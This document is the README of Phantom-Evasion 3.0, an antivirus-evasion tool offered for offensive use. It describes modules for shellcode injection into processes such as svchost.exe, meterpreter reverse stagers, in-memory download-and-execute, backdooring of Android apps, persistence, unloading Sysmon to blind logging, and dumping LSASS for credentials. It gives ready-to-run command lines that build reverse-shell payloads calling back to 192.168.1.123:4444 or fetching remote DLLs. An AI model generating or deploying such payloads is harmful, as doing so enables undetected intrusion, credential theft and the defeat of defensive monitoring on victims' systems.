# PHANTOM EVASION 3.0 

Phantom-Evasion is an antivirus evasion tool written in python (both compatible with python and python3) capable to generate (almost) fully undetectable executable even with the most common x86 msfvenom payload.

The following OSs officialy support automatic setup:

1. Kali Linux                   
2. Parrot Security              

The following OSs likely support automatic setup but require manual installation of metasploit-framework:

1. OSX (tested on Catalina)
2. Ubuntu                       
3. Linux Mint                   
4. Elementary                   
5. Deepin                       
6. other Debian distro                     
7. Centos
8. Fedora
9. Blackarch

The following OSs require manual setup:

1. Windows 10

Simply git clone or download and unzip Phantom-Evasion folder

## Setup:

Automatic setup, open a terminal and execute:

```
python3 phantom-evasion.py --setup
```

or:

```
chmod +x ./phantom-evasion.py

./phantom-evasion.py --setup
```
or start phantom-evasion in interactive mode and select option 7 

## Dependencies (only for manual setup)

1. metasploit-framework
2. mingw-w64 (cygwin on windows)
3. gcc-multilib
4. apktool
5. apksigner
6. strip
7. osslsigncode

## CMDLINE/INTERACTIVE:

1. Launch phantom-evasion in interactive mode:

```
python3 phantom-evasion.py
```
or:

```
./phantom-evasion.py
```

2. Otherwise to see cmdline mode options:

```
python3 phantom-evasion.py --help
```
or:

```
./phantom-evasion.py --help
```
## WINDOWS Modules

-Every windows payload C module and can be compiled (support both x86 and x64) as EXE or DLL/ReflectiveDLL.

-Randomized junkcode injection (intensity,frequency and reinjection probability can be set) and windows antivirus evasion techniques (frequency can be set).

-Multibyte Xor/Vigenere shellcode/file encryption supported in both Shellcode injection and Donwload Exec modules.

-Ntdll unhookapi and Peb process masquerading technique supported.

-Wide range of execution mode supported (both local and remote).

-Wide range of payload memory allocation mode(Virtual_RWX,Virtual_RW/RX,Virtual_RW/RWX,Heap_RWX).

-Dynamic loading of Windows api can be set.

-Certificate spoofer and signer supported.

-Strip executable (https://en.wikipedia.org/wiki/Strip_(Unix))

## Windows C Shellcode Injection 

Msfvenom windows payloads and custom shellcode supported.
Shellcode can be stored as resource and retrieved at runtime with FindResource API.

Shellcode Encryption supported: 

    1.none

    2.Multibyte-Xor

    3.Double-key Multibyte-Xor

    4.Vigenere

    5.Double-key Vigenere

1. Local exec method can be one of the following:  
                                                   
    Thread
                                                   
    APC    

   Local Memory allocation mode can be one of the following: 

    Virtual_RWX
                                                             
    Virtual_RW/RX
                                                         
    Virtual_RW/RWX
                                                           
    Heap_RWX

2. Remote exec method can be one of the following: 

    ThreadExecutionHijack (shorten is TEH)
                                                  
    Processinject         (shorten is PI)
                                                   
    APCSpray              (shorten is APCS)
                                                 
    EarlyBird             (shorten is EB)
                                                  
    EntryPointHijack      (shorten is EPH) 

   Remote Memory allocation mode can be one of the following: 

    Virtual_RWX
                                                            
    Virtual_RW/RX
                                                              
    Virtual_RW/RWX
                                                                                   

## Windows Pure C meterpreter stager (C)

Pure C meterpreter stager (TCP/HTTP/HTTPS) modules compatible with msfconsole and cobalt strike beacon. (reverse_tcp/reverse_http/reverse_https) 

Using cmdline mode:

    reverse_tcp c stager is WRT

    reverse_http c stager is WRH

    reverse_https c stager is WRS

1. Local exec method can be one of the following:  

    Thread 
                                        
    APC    

   Local Memory allocation mode can be one of the following: 

    Virtual_RWX
                                                           
    Virtual_RW/RX
                                                           
    Virtual_RW/RWX
                                                           
    Heap_RWX

## Windows C Download-Exec NoDiskWrite

Download exe/dll from supplied url in memory and execute/load into remote process (without writing on disk).

EXE/DLL Encrypted Download supported: 

    1.none
                                     
    2.Multibyte-Xor
                                     
    3.Double-key Multibyte-Xor
                                   
    4.Vigenere
                                    
    5.Double-key Vigenere

The Encrypted DLL/EXE will be saved as originalfilename + "crypt" + ".dll" or ".exe" this is the one to be downloaded

1. Windows DownloadExecExe NoDiskWrite (WDE using cmdline mode):

   Remote exec method can be one of the following: 

    ProcessHollowing (shorten is PH)

                                                 

2. Windows DownloadExecDll NoDiskWrite (WDD using cmdline mode):

   Remote loading method can be one of the following: 

    ReflectiveDll    (shorten is RD)
                                                    
    RDAPC            (ReflectiveDllAPC)
                                                    
    ManualMap        (shorten is MM) ---> only x86
                                                      
## LINUX PAYLOADS

## Linux Shellcode Injection Module (C)

Msfvenom linux payloads and custom shellcodes supported.

## ANDROID PAYLOADS

1. Android Msfvenom Obfuscate Backdoor:

    Obfuscate msfvenom payloads an rebuild (smali/baksmali) with apktool.
    Obfuscated payload can be used to backdoor benign apk files.
             
## PERSISTENCE Modules

1. Windows Persistence RegCreateKeyExW Add Registry Key  (C)
    Compiled executable need to be uploaded to the target machine and excuted specifing the fullpath to file to add to startup as argument.

2. Windows Persistence REG Add Registry Key (CMD)
    This module generate persistence cmdline payloads (Add Registry Key via REG.exe).  
    
3. Windows Persistence Keep Process Alive (C)
    Compiled executable need to be uploaded to the target machine and executed.
    Use CreateToolSnapshoot ProcessFirst and ProcessNext to check if specified process is alive every X seconds (if not create a new process using WinExec API)

4. Windows Persistence Schtasks (CMD)

    This module generate persistence cmdline payloads (using Schtasks.exe).

5. Windows Persistence Create Service (CMD)

    This module generate persistence cmdline payloads (using sc.exe).

## PRIVILEGE ESCALATION Modules

1. Windows DuplicateTokenEx (C)
    
    Create a new process with a token cloned from another process.
    Compiled executable need to be uploaded to the target machine and executed.

## POSTEXPLOITATION Modules

1. Windows Unload Sysmon (C)
    Unload sysmon driver which causes the system to stop recording sysmon event logs.
    Compiled executable need to be uploaded to the target machine and executed.

2. Windows Unload Sysmon (CMD)
    Unload sysmon driver which causes the system to stop recording sysmon event logs.

3. Windows Attrib hide file (CMD)
    Use attrib to hide file    

4. Windows SetFileAttribute hidden (C)
    Hide file using SetFileAttribute API
    Compiled executable need to be uploaded to the target machine and executed.

5. Windows DumpLsass (C)
    Dump Lsass using MiniWriteDumpWrite API.
    Compiled executable need to be uploaded to the target machine and executed.


6. Windows DumpLsass (CMD)

    Dump Lsass from cmdline.

## Phantom-Evasion Cmdline mode examples:

1. windows shellcode injection,output signed exe with spoofed https certificate,local execution method: Thread, mem: Virtual_RWX , encryption: vigenere

```
python3 phantom-evasion.py -m WSI -msfp windows/meterpreter/reverse_tcp -H 192.168.1.123 -P 4444 -i Thread -e 4 -mem Virtual_RWX -j 1 -J 15 -jr 0 -E 5 -c www.windows.com:443 -f exe -o filename.exe
```

2. windows x64 shellcode injection ,output as reflective dll ,remote execution method: ProcessInject (PI), mem: Virtual_RW/RX , target process: SkypeApp.exe ,encryption: double key xor

```
python3 phantom-evasion.py -m WSI -msfp windows/x64/meterpreter/reverse_tcp -a x64 -H 192.168.1.123 -P 4444 -tp SkypeApp.exe -i PI -e 3 -mem Virtual_RW/RX -j 1 -J 15 -jr 0 -E 5 -f dll -R -o filename.dll
```

3. windows x64 shellcode injection ,output as stripped dll, shellcode stored as resource, remote execution method: EarlyBird (EB) , mem: Virtual_RW/RX , target process: svchost.exe ,encryption: xor

```
python3 phantom-evasion.py -m WSI -msfp windows/x64/meterpreter/reverse_tcp -a x64 -H 192.168.1.123 -P 4444 -tp svchost.exe -i EB -e 2 -mem Virtual_RW/RX -j 1 -J 15 -jr 0 -E 5 -f dll -res -S -o filename.dll
```

4. windows x64 reverse https stager ,output as stripped dll,local execution method: Thread , mem: Heap_RWX

```
python3 phantom-evasion.py -m WRS -a x64 -H 192.168.1.123 -P 4444 -i Thread -mem Heap_RWX -j 1 -J 15 -jr 0 -E 5 -f dll -S -o filename.dll
```

5. windows x86 downloadexec dll ,output as stripped exe ,remote execution method: ManualMap (MM), target process: OneDrive.exe ,downloadsize 1000000 bytes 

```
python3 phantom-evasion.py -m WDD -U http://192.168.1.123/payload.dll -i MM -tp OneDrive.exe -ds 1000000  -j 10 -J 10 -jr 0 -E 10 -f exe -S -o filename.exe

```

6. windows x64 downloadexec exe ,output as stripped reflective dll,remote execution method: ProcessHollowing (PH), target process: svchost.exe ,downloadsize 1000000 bytes 

```
python3 phantom-evasion.py -m WDE -U http://192.168.1.123/payloadcrypt.exe -e 4 -ef payload.exe -i PH -tp svchost.exe -ds 1000000  -j 1 -J 5 -jr 0 -E 3 -f dll -R -S -o filename.dll

```

## License

GPLv3.0

## Credits and usefull resources

https://github.com/stephenfewer/ReflectiveDLLInjection

https://github.com/rsmudge/metasploit-loader

https://ired.team

https://github.com/theevilbit/injection

http://www.rohitab.com/discuss/topic/40761-manual-dll-injection/

https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process

https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
